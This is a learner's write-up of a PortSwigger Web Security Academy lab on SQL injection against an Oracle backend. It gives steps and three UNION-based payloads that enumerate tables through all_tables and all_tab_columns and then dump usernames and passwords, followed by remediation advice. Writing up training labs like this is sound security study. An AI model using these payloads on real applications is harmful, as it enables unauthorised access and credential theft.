# Lab 10 — SQL injection attack, listing the database contents on Oracle

**Category:** SQL Injection
**Difficulty:** Practitioner
**Reference:** https://portswigger.net/web-security/sql-injection/examining-the-database

## Objective
Enumerate schema and dump credentials on an Oracle database, which does not expose `information_schema` and instead uses `all_tables` / `all_tab_columns`.

## Vulnerability
Injectable `category` parameter on an Oracle backend.

## Steps to Reproduce
1. List tables: `UNION SELECT table_name, NULL FROM all_tables--`
2. Find the credentials table and list its columns: `UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XXXX'--` (note: table names are often upper-case in Oracle metadata).
3. Dump the username/password columns and log in as administrator.

## Payload(s) Used
```
category=Gifts' UNION SELECT table_name, NULL FROM all_tables--
category=Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XXXX'--
category=Gifts' UNION SELECT USERNAME_YYYY, PASSWORD_ZZZZ FROM USERS_XXXX--
```

## Explanation
Oracle doesn't ship `information_schema`; its equivalent metadata lives in `all_tables` and `all_tab_columns`, which are queryable by any authenticated DB session by default, allowing the same enumerate-then-dump approach as on other engines.

## Screenshots
_Add your screenshots here, e.g. `./screenshots/sqli-lab-10-01.png`_

## Remediation
Least-privilege DB accounts that cannot read Oracle's data dictionary views, plus parameterized queries.

---
*Lab solved on PortSwigger Web Security Academy. Writeup by Miley.*
